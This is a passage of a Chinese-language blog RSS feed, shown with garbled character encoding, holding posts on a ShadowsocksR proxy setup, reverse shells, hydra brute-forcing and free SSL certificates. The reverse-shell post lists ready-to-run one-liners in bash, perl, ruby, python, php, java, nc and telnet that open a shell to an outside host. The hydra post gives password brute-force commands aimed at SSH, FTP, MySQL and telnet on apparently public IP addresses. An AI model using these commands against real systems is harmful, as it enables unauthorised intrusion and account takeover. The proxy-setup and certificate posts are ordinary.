&lt;p&gt;SSH æ‰“å¼€åˆšæ‰åˆ›å»ºçš„è™šæ‹Ÿæœºï¼Œæ‰§è¡Œä»¥ä¸‹å‘½ä»¤åˆ›å»º ShadowsocketR æœåŠ¡ï¼ŒæœŸé—´è®°ä½è¾“å…¥çš„&lt;strong&gt;å¯†ç &lt;/strong&gt;å’Œ&lt;strong&gt;ç«¯å£å·&lt;/strong&gt;ï¼Œå…¶ä»–ä¿æŒé»˜è®¤&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# åˆ‡æ¢rootæƒé™&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# ä¸‹è½½ä¸€é”®å®‰è£…è„šæœ¬&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;wget &lt;span class=&quot;nt&quot;&gt;--no-check-certificate&lt;/span&gt; https://raw.githubusercontent.com/wangjunneil/one-key-script/master/shadowsocksR.sh

&lt;span class=&quot;c&quot;&gt;# èµ‹äºˆæƒé™å¹¶æ‰§è¡Œä¸€é”®å®‰è£…è„šæœ¬&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;chmod&lt;/span&gt; +x shadowsocksR.sh &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; ./shadowsocksR.sh
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;è„šæœ¬æ‰§è¡Œå®Œæˆåï¼Œä¼šæ˜¾ç¤ºæœ€ç»ˆçš„ SSR é“¾æ¥ä¿¡æ¯ï¼Œå¦‚ä¸‹ï¼š&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;//vinnycc.oss-cn-shanghai.aliyuncs.com/20190605/ssr-result.png&quot; alt=&quot;ssr-result&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;4-é…ç½®é˜²ç«å¢™&quot;&gt;4. é…ç½®é˜²ç«å¢™&lt;/h2&gt;

&lt;p&gt;åœ¨åˆ›å»ºå®ä¾‹æ—¶å‹¾é€‰çš„ http å’Œ https å·²é»˜è®¤å¼€é€š 80 å’Œ 443ç«¯å£ï¼Œè¿™é‡Œ shadownsocketR æœåŠ¡ç”¨çš„ç«¯å£æ˜¯ 5001ï¼Œéœ€è¦åœ¨é˜²ç«å¢™ä¸­å…è®¸ 5001 ç«¯å£çš„å‡ºå…¥æ ˆè§„åˆ™ã€‚
åœ¨ Google äº‘æ§åˆ¶å°ç‚¹å‡» VPC ç½‘ç»œ - é˜²ç«å¢™è§„åˆ™ï¼Œç‚¹å‡»åˆ›å»ºé˜²ç«å¢™è§„åˆ™ã€‚åç§°éšæ„ï¼Œ&lt;strong&gt;æ¥æº IP åœ°å€èŒƒå›´&lt;/strong&gt;ä½¿ç”¨ &lt;strong&gt;0.0.0.0/0&lt;/strong&gt;ï¼Œ&lt;strong&gt;åè®®å’Œç«¯å£&lt;/strong&gt;å°†5001ç«¯å£çš„
tcpå’Œudpéƒ½å¼€é€šï¼Œå…¶ä»–é»˜è®¤ï¼Œå…·ä½“å¦‚ä¸‹ï¼š&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;//vinnycc.oss-cn-shanghai.aliyuncs.com/20190605/fire-rule.png&quot; alt=&quot;fire-rule&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;5-å®¢æˆ·ç«¯é“¾æ¥&quot;&gt;5. å®¢æˆ·ç«¯é“¾æ¥&lt;/h2&gt;

&lt;p&gt;æœ¬åœ°ä¸‹è½½å®‰è£… SSR å®¢æˆ·ç«¯ï¼š&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;MacOSï¼Œ&lt;a href=&quot;//github.com/shadowsocks/ShadowsocksX-NG/releases/download/v1.8.2/ShadowsocksX-NG.app.1.8.2.zip&quot;&gt;ç‚¹å‡»ä¸‹è½½&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;Windowsï¼Œ&lt;a href=&quot;//github.com/shadowsocks/shadowsocks-windows/releases/download/4.1.6/Shadowsocks-4.1.6.zip&quot;&gt;ç‚¹å‡»ä¸‹è½½&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;è¿™é‡Œä»¥ MacOS å®¢æˆ·ç«¯ä¸ºä¾‹å­&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;//vinnycc.oss-cn-shanghai.aliyuncs.com/20190605/client-connect.png&quot; alt=&quot;client-connect&quot; /&gt;&lt;/p&gt;

&lt;p&gt;è‡³æ­¤ï¼Œæ‰€æœ‰æ“ä½œå·²ç»å®Œæˆï¼Œåªéœ€è¦åœ¨æœ¬åœ°é…ç½®å¥½è¿æ¥å³å¯å›½é™…æ—…æ¸¸&lt;/p&gt;
</description>  
               <pubDate>Wed, 05 Jun 2019 00:00:00 +0800</pubDate>  
               <link>http://localhost:4000/2019/06/ssr-build/</link>  
               <guid isPermaLink="true">http://localhost:4000/2019/06/ssr-build/</guid>  
               </item>  
          
            <item>  
               <title>è§¦å‘åå‘ shell çš„å¤šç§æ–¹å¼è·å–æ§åˆ¶æƒ</title>  
               <description>&lt;ul id=&quot;markdown-toc&quot;&gt;
  &lt;li&gt;&lt;a href=&quot;#åŸç†&quot; id=&quot;markdown-toc-åŸç†&quot;&gt;åŸç†&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#å¯åŠ¨ç›‘å¬&quot; id=&quot;markdown-toc-å¯åŠ¨ç›‘å¬&quot;&gt;å¯åŠ¨ç›‘å¬&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#åå‘è¿æ¥&quot; id=&quot;markdown-toc-åå‘è¿æ¥&quot;&gt;åå‘è¿æ¥&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;//vinnycc.oss-cn-shanghai.aliyuncs.com/20190605/1512862_1adf.png&quot; alt=&quot;metasploit&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;åŸç†&quot;&gt;åŸç†&lt;/h2&gt;

&lt;p&gt;æ­£å‘è¿æ¥è·å–shellçš„æ–¹å¼æ—©å·²ä¸æ˜¯ä¸»æµï¼Œå¾ˆå®¹æ˜“è¢«é˜²ç«å¢™æˆ–è€…æ€æ¯’è½¯ä»¶ç›‘æ§åˆ°ï¼Œé™¤éæ˜¯æ­£å¸¸çš„æˆæƒæ“ä½œæ–¹å¼ã€‚åå‘è¿æ¥åŸç†æ˜¯æ”»å‡»è€…å¯åŠ¨ç›‘å¬æœåŠ¡ï¼Œç­‰å¾…è¢«æ”»å‡»è€…ä¸»åŠ¨è¿æ¥ä»è€Œè·å–shellï¼Œè¿æ¥é€šå¸¸æ˜¯å»ºç«‹ &lt;strong&gt;/bin/bash&lt;/strong&gt; æˆ–è€… &lt;strong&gt;cmd&lt;/strong&gt; çš„é€šé“ã€‚&lt;/p&gt;

&lt;h2 id=&quot;å¯åŠ¨ç›‘å¬&quot;&gt;å¯åŠ¨ç›‘å¬&lt;/h2&gt;

&lt;p&gt;ä½¿ç”¨ metasploit å¸¸è§„ç›‘å¬æ–¹å¼&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; use exploit/multi/handler
msf exploit&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;handler&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;payload generic/shell_reverse_tcp
msf exploit&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;handler&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; ...... &lt;span class=&quot;c&quot;&gt;# è®¾ç½®ç›‘å¬å‚æ•°&lt;/span&gt;
msf exploit&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;handler&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; exploit &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;åå‘è¿æ¥&quot;&gt;åå‘è¿æ¥&lt;/h2&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# bash&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;bash &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /dev/tcp/m1d8457118.iok.la/12832 0&amp;lt;&amp;amp;1 2&amp;gt;&amp;amp;1

&lt;span class=&quot;c&quot;&gt;# perl&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;perl &lt;span class=&quot;nt&quot;&gt;-MIO&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,&quot;m1d8457118.iok.la:12832&quot;);STDIN-&amp;gt;fdopen($c,r);$~-&amp;gt;fdopen($c,w);system$_ while&amp;lt;&amp;gt;;'&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# ruby&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ruby &lt;span class=&quot;nt&quot;&gt;-rsocket&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'exit if fork;c=TCPSocket.new(&quot;m1d8457118.iok.la&quot;,&quot;12832&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;){|io|c.print io.read}end'&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# python&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;python &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;m1d8457118.iok.la&quot;,12832));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);'&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# php&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;php &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'$sock=fsockopen(&quot;m1d8457118.iok.la&quot;,12832);exec(&quot;/bin/sh -i &amp;lt;&amp;amp;3 &amp;gt;&amp;amp;3 2&amp;gt;&amp;amp;3&quot;);'&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# java&lt;/span&gt;
r &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; Runtime.getRuntime&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
p &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; r.exec&lt;span class=&quot;o&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;/bin/bash&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;-c&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;exec 5&amp;lt;&amp;gt;/dev/tcp/m1d8457118.iok.la/12832;cat &amp;lt;&amp;amp;5 | while read line; do &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\$&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;line 2&amp;gt;&amp;amp;5 &amp;gt;&amp;amp;5; done&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; as String[]&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
p.waitFor&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# nc&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nc &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; /bin/sh m1d8457118.iok.la 12832
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;/bin/sh | nc m1d8457118.iok.la 12832 &lt;span class=&quot;c&quot;&gt;# -e é€‰é¡¹è¢«ç¦ç”¨çš„æƒ…å†µ&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# telnet&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;mknod &lt;/span&gt;backpipe p &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; telnet m1d8457118.iok.la 12832 0&amp;lt;backpipe | /bin/bash 1&amp;gt;backpipe
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
</description>  
               <pubDate>Wed, 05 Jun 2019 00:00:00 +0800</pubDate>  
               <link>http://localhost:4000/2019/06/reversh-shell-way/</link>  
               <guid isPermaLink="true">http://localhost:4000/2019/06/reversh-shell-way/</guid>  
               </item>  
          
            <item>  
               <title>è€ç‰Œæš´åŠ›ç ´è§£å·¥å…· hydra çš„ä½¿ç”¨</title>  
               <description>&lt;ul id=&quot;markdown-toc&quot;&gt;
  &lt;li&gt;&lt;a href=&quot;#è¯´æ˜&quot; id=&quot;markdown-toc-è¯´æ˜&quot;&gt;è¯´æ˜&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#ä½¿ç”¨&quot; id=&quot;markdown-toc-ä½¿ç”¨&quot;&gt;ä½¿ç”¨&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p style=&quot;text-align:center;&quot;&gt;
&lt;img src=&quot;//vinnycc.oss-cn-shanghai.aliyuncs.com/20190605/xhydra.png&quot; style=&quot;margin-left:5px;&quot; /&gt;
&lt;/p&gt;

&lt;h2 id=&quot;è¯´æ˜&quot;&gt;è¯´æ˜&lt;/h2&gt;

&lt;p&gt;&lt;a href=&quot;//github.com/vanhauser-thc/thc-hydra&quot;&gt;Hydra&lt;/a&gt; æ˜¯æ¯”è¾ƒå¸¸è§„çš„æš´åŠ›ç ´è§£å·¥å…·ï¼Œæ”¯æŒå¤šç§åè®®ï¼Œå¦‚ä¸‹ï¼š&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Cisco AAA, Cisco auth, Cisco enable, CVS, FTP, HTTP(S)-FORM-GET, HTTP(S)-FORM-POST, HTTP(S)-GET, HTTP(S)-HEAD, HTTP-Proxy, ICQ, IMAP, IRC, LDAP, MS-SQL, MySQL, NNTP, Oracle Listener, Oracle SID, PC-Anywhere, PC-NFS, POP3, PostgreSQL, RDP, Rexec, Rlogin, Rsh, SIP, SMB(NT), SMTP, SMTP Enum, SNMP v1+v2+v3, SOCKS5, SSH (v1 and v2), SSHKEY, Subversion, Teamspeak (TS2), Telnet, VMware-Auth, VNC and XMPP
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;ä½¿ç”¨&quot;&gt;ä½¿ç”¨&lt;/h2&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# ssh&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;hydra &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; root &lt;span class=&quot;nt&quot;&gt;-P&lt;/span&gt; password.lst &lt;span class=&quot;nt&quot;&gt;-vV&lt;/span&gt; ssh://139.196.15.128:4322

&lt;span class=&quot;c&quot;&gt;# ftp&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;hydra &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; admin &lt;span class=&quot;nt&quot;&gt;-P&lt;/span&gt; password.lst &lt;span class=&quot;nt&quot;&gt;-vV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; 10 ftp://14.23.48.233

&lt;span class=&quot;c&quot;&gt;# mysql&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;hydra &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; root &lt;span class=&quot;nt&quot;&gt;-P&lt;/span&gt; password.lst &lt;span class=&quot;nt&quot;&gt;-vV&lt;/span&gt; 113.109.217.131 mysql

&lt;span class=&quot;c&quot;&gt;# telnet&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;hydra &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; administrator password.lst &lt;span class=&quot;nt&quot;&gt;-vV&lt;/span&gt; telnet://125.216.34.132

&lt;span class=&quot;c&quot;&gt;#vnc&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;hydra &lt;span class=&quot;nt&quot;&gt;-P&lt;/span&gt; passwordlist &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; 1 &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; 5 &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; 5901 192.168.100.155 vnc &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# web login&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# Examples:&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# &quot;/login.php:user=^USER^&amp;amp;pass=^PASS^:incorrect&quot;&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# &quot;/login.php:user=^USER^&amp;amp;pass=^PASS^&amp;amp;colon=colon\:escape:S=authlog=.*success&quot;&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# &quot;/login.php:user=^USER^&amp;amp;pass=^PASS^&amp;amp;mid=123:authlog=.*failed&quot;&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# &quot;/:user=^USER&amp;amp;pass=^PASS^:failed:H=Authorization\: Basic dT1w:H=Cookie\: sessid=aaaa:h=X-User\: ^USER^&quot;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;hydra 192.168.100.155 &lt;span class=&quot;nt&quot;&gt;-V&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; admin &lt;span class=&quot;nt&quot;&gt;-P&lt;/span&gt; passwordlist http-get-form &lt;span class=&quot;s2&quot;&gt;&quot;/dvwa/vulnerabilities/brute/:username=^USER^&amp;amp;password=^PASS^&amp;amp;Login=Login:F=Username and/or password incorrect.:H=Cookie: PHPSESSID=rjevaetqb3dqbj1ph3nmjchel2; security=low&quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
</description>  
               <pubDate>Wed, 05 Jun 2019 00:00:00 +0800</pubDate>  
               <link>http://localhost:4000/2019/06/hydra-brute-force/</link>  
               <guid isPermaLink="true">http://localhost:4000/2019/06/hydra-brute-force/</guid>  
               </item>  
          
            <item>  
               <title>å¼€æºå…è´¹çš„ SSL è¯ä¹¦æ±‡æ€»</title>  
               <description>&lt;ul id=&quot;markdown-toc&quot;&gt;
  &lt;li&gt;&lt;a href=&quot;#1-google-mkcert&quot; id=&quot;markdown-toc-1-google-mkcert&quot;&gt;1. Google Mkcert&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#11-å®‰è£…&quot; id=&quot;markdown-toc-11-å®‰è£…&quot;&gt;1.1. å®‰è£…&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#12-ç”Ÿæˆ&quot; id=&quot;markdown-toc-12-ç”Ÿæˆ&quot;&gt;1.2. ç”Ÿæˆ&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#13-ä½¿ç”¨&quot; id=&quot;markdown-toc-13-ä½¿ç”¨&quot;&gt;1.3. ä½¿ç”¨&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#2-lets-encrypt&quot; id=&quot;markdown-toc-2-lets-encrypt&quot;&gt;2. Letâ€™s Encrypt&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#21-å®‰è£…&quot; id=&quot;markdown-toc-21-å®‰è£…&quot;&gt;2.1. å®‰è£…&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#21-ä½¿ç”¨&quot; id=&quot;markdown-toc-21-ä½¿ç”¨&quot;&gt;2.1. ä½¿ç”¨&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#22-ç»­è®¢&quot; id=&quot;markdown-toc-22-ç»­è®¢&quot;&gt;2.2. ç»­è®¢&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;1-google-mkcert&quot;&gt;1. Google Mkcert&lt;/h2&gt;

&lt;p&gt;Goè¯­è¨€ç¼–å†™ï¼Œç”¨äºç”Ÿæˆæœ¬åœ°HTTPSè¯ä¹¦çš„å·¥å…·ï¼Œå®˜ç½‘&lt;a href=&quot;//github.com/FiloSottile/mkcert&quot;&gt;åœ°å€&lt;/a&gt;ã€‚&lt;/p&gt;

&lt;h3 id=&quot;11-å®‰è£…&quot;&gt;1.1. å®‰è£…&lt;/h3&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# Macæ–¹å¼å®‰è£…ï¼Œå…¶ä»–å¹³å°è§å®˜ç½‘&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;brew &lt;span class=&quot;nb&quot;&gt;install &lt;/span&gt;mkcert

&lt;span class=&quot;c&quot;&gt;# å¦‚æœç”¨çš„æ˜¯firefoxè¿˜éœ€å®‰è£…nss&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;brew &lt;span class=&quot;nb&quot;&gt;install &lt;/span&gt;nss
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;12-ç”Ÿæˆ&quot;&gt;1.2. ç”Ÿæˆ&lt;/h3&gt;

&lt;p&gt;æ ¹è¯ä¹¦ç”Ÿæˆåä¼šåœ¨Macç³»ç»Ÿé’¥åŒ™ä¸²åº”ç”¨ä¸‹çš„è¯ä¹¦é¡¹ä¸­ï¼Œå­˜åœ¨ &lt;strong&gt;mkcert&lt;/strong&gt; çš„å·²å®‰è£…çš„è¯ä¹¦&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# ç”Ÿæˆæ ¹è¯ä¹¦ï¼ˆåªéœ€ç”Ÿæˆä¸€æ¬¡ï¼‰&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;mkcert &lt;span class=&quot;nt&quot;&gt;-install&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# ç”Ÿæˆå¯¹åº”åŸŸåè¯ä¹¦ï¼Œå¯ç”Ÿæˆå¤šä¸ªï¼Œä¹Ÿæ”¯æŒæ³›åŸŸå&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;mkcert localhost 127.0.0.1

Created a new certificate valid &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;the following names
 - &lt;span class=&quot;s2&quot;&gt;&quot;localhost&quot;&lt;/span&gt;
 - &lt;span class=&quot;s2&quot;&gt;&quot;127.0.0.1&quot;&lt;/span&gt;

The certificate is at &lt;span class=&quot;s2&quot;&gt;&quot;./localhost+2.pem&quot;&lt;/span&gt; and the key at &lt;span class=&quot;s2&quot;&gt;&quot;./localhost+2-key.pem&quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;13-ä½¿ç”¨&quot;&gt;1.3. ä½¿ç”¨&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# nginx
ssl_certificate     /etc/nginx/ssl/localhost+2.pem;
ssl_certificate_key /etc/nginx/ssl/localhost+2-key.pem;

# jekyll
$ sudo jekyll serve --ssl-cert ./localhost+2.pem --ssl-key ./localhost+2-key.pem --port 443

# http-server
$ http-server -p 443 --ssl --cert ./localhost+2.pem --key ./localhost+2-key.pem
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ç§»åŠ¨ç«¯ä½¿ç”¨ï¼ŒIOSä½¿ç”¨safariä¸‹è½½ &lt;strong&gt;rootCA.pem&lt;/strong&gt; å¹¶å®‰è£…ï¼Œåœ¨è®¾ç½®é‡Œç¡®è®¤å¹¶ä¿¡ä»»æ­¤è¯ä¹¦ï¼›Androidå®‰è£…æ¯”è¾ƒç‰¹æ®Šï¼Œå¯&lt;a href=&quot;//stackoverflow.com/questions/4461360/how-to-install-trusted-ca-certificate-on-android-device/22040887#22040887&quot;&gt;å‚è€ƒ&lt;/a&gt;ã€‚&lt;/p&gt;

&lt;h2 id=&quot;2-lets-encrypt&quot;&gt;2. Letâ€™s Encrypt&lt;/h2&gt;

&lt;p&gt;Letâ€™s Encrypt æ˜¯ç”± Mozilla å‘èµ·ï¼Œè¯¸å¤š CDN å‚å•†ï¼Œæµè§ˆå™¨å‚å•†å…±åŒæ”¯æŒçš„å…è´¹ SSL é¡¹ç›®ã€‚Letâ€™s Encrypt ä½¿ç”¨ä¸€ä¸ªå‘½ä»¤è¡Œå·¥å…·
&lt;a href=&quot;https://certbot.eff.org/&quot;&gt;certbot&lt;/a&gt; æ¥è‡ªåŠ¨å®Œæˆ CSR ç”Ÿæˆï¼Œå‘èµ·ç”³è¯·ï¼ŒDCV (Domain Control Validation) éªŒè¯ï¼Œè·å–è¯
ä¹¦çš„å·¥ä½œï¼ŒåŸºæœ¬ä¸Šä¸€è¡Œå‘½ä»¤å°±æå®šã€‚&lt;/p&gt;

&lt;h3 id=&quot;21-å®‰è£…&quot;&gt;2.1. å®‰è£…&lt;/h3&gt;

&lt;p&gt;è¿™é‡Œä»¥ Debain9 å’Œ nginx ä¸ºä¾‹å­&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;apt-get &lt;span class=&quot;nb&quot;&gt;install &lt;/span&gt;certbot python-certbot-nginx &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; stretch-backports
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;21-ä½¿ç”¨&quot;&gt;2.1. ä½¿ç”¨&lt;/h3&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# è¯ä¹¦å…¨è‡ªåŠ¨å®‰è£…&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;certbot &lt;span class=&quot;nt&quot;&gt;--nginx&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# éœ€è¦æœ‰æ‰€å®šåˆ¶åˆ™ä½¿ç”¨ä¸‹é¢å‘½ä»¤å®‰è£…&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;certbot &lt;span class=&quot;nt&quot;&gt;--nginx&lt;/span&gt; certonly
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

